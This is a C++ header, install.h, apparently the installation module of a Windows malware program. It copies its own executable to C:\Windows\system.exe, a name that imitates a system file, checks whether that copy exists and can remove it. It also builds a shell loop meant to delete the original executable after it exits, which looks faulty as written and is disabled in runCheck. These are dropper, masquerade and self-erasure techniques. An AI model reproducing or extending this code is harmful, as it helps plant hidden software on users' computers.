/*
*	install.h
*/

#ifndef __INSTALL
#define __INSTALL

#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <vector>
#include <sstream>
#include "lib.h"

char* GetDefaultModuleFileName(void) {
	char* szModuleFileName = (char*)malloc(sizeof(char) * MAX_PATH);
	GetModuleFileNameA(NULL, szModuleFileName, MAX_PATH);
	return szModuleFileName;
}

const char* EXEC_DROP_PATH = "C:\\Windows\\system.exe";
LPSTR moduleFileName = GetDefaultModuleFileName();

bool execInstalled(void) {
	std::fstream file;
	file.open(EXEC_DROP_PATH, std::ios::in);

	if (file) {
		return true;
	}

	return false;
}

void install(void) {
	std::fstream in;
	in.open(moduleFileName, std::ios::in);

	if (in) {
		std::fstream out;
		out.open(EXEC_DROP_PATH, std::ios::out);
		if (out) {
			CopyFileA(moduleFileName, EXEC_DROP_PATH, false);

			out.close();
			in.close();

			return;
		}

		in.close();
	}

	printf("Error copying executable");
}

void scheduleDeletion(void) {
	std::vector<char*> fileNameSplit = split(moduleFileName, '\\');
	const char* executable = fileNameSplit.back();

	std::stringstream ss_parameters;
	ss_parameters 	<< ":LoopStart ^\n" <<
					"IF tasklist /FI \"IMAGENAME equ " << executable << "\" GOTO :LoopStart ^ \n"
					"del" << " " << "\"" << moduleFileName << "\"";

	std::string str = ss_parameters.str();
	const char* parameters = str.c_str();

	printf("%s\n", parameters);
	system(parameters);

	// // ShellExecuteA(NULL,
	// // 	NULL,
	// // 	"del",
	// // 	parameters,
	// // 	NULL,
	// // 	0
	// // );
}

void runCheck(void) {
	if (!execInstalled()) {
		install();
		// scheduleDeletion();
	}
}

void uninstall(void) {
	printf("Uninstalling...");
	if (execInstalled()) {
		DeleteFileA(EXEC_DROP_PATH);
	}
}

#endif
